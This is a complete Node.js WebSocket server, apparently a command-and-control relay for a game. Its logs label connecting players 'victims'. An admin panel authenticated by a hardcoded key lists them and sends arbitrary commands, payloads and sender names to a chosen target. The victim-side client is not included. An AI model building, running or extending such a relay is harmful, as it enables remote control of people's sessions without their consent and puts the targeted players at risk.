const WebSocket = require('ws');

const PORT = process.env.PORT || 8080;
const wss = new WebSocket.Server({ port: PORT });

const CHAVE_SECRETA = "BatataFritaComQueijo123";

let clientesConectados = new Map();
let painelAdmin = null;

console.log(`[SERVIDOR] WebSocket rodando com sucesso na porta ${PORT}...`);

wss.on('connection', (ws) => {
    console.log('[CONEXÃO] Novo cliente conectado ao servidor.');

    ws.on('message', (message) => {
        let data;
        try {
            data = JSON.parse(message);
        } catch (e) {
            console.log('[ERRO] Mensagem recebida não é um JSON válido.');
            return;
        }

        if (data.tipo === 'auth') {
            if (data.chave !== CHAVE_SECRETA) {
                console.log('[AUTENTICAÇÃO FALHOU] Chave incorreta de um cliente.');
                ws.close();
                return;
            }
            clientesConectados.set(data.jogador, ws);
            ws.nomeJogador = data.jogador;
            console.log(`[VÍTIMA CONECTADA]: ${data.jogador}`);
            
            sincronizarLista();
        }

        if (data.tipo === 'auth_admin') {
            if (data.chave !== CHAVE_SECRETA) {
                console.log('[AUTENTICAÇÃO FALHOU] Login inválido no Admin.');
                ws.close();
                return;
            }
            painelAdmin = ws;
            console.log('[PAINEL ADMIN CONECTADO COM SUCESSO]');
            sincronizarLista();
        }

        if (data.tipo === 'comando' && ws === painelAdmin) {
            let alvoSocket = clientesConectados.get(data.alvo);
            
            if (alvoSocket && alvoSocket.readyState === WebSocket.OPEN) {
                // CORREÇÃO: Repassa o comando E o payload/remetente corretamente!
                alvoSocket.send(JSON.stringify({
                    comando: data.comando,
                    payload: data.payload,
                    remetente: data.remetente
                }));
                console.log(`[COMANDO ENVIADO] Alvo: ${data.alvo} | Ação: ${data.comando}`);
            } else {
                console.log(`[ERRO] Alvo "${data.alvo}" não foi encontrado ou está desconectado.`);
            }
        }
    });

    ws.on('close', () => {
        if (ws === painelAdmin) {
            painelAdmin = null;
            console.log('[PAINEL ADMIN] Você se desconectou do servidor.');
        } else if (ws.nomeJogador) {
            clientesConectados.delete(ws.nomeJogador);
            console.log(`[VÍTIMA DESCONECTADA]: ${ws.nomeJogador}`);
            sincronizarLista();
        }
    });

    ws.on('error', (err) => {
        console.log('[ERRO NO SOCKET]:', err.message);
    });
});

function sincronizarLista() {
    if (painelAdmin && painelAdmin.readyState === WebSocket.OPEN) {
        let listaNomes = Array.from(clientesConectados.keys());
        painelAdmin.send(JSON.stringify({
            tipo: "atualizar_lista",
            clientes: listaNomes
        }));
    }
}
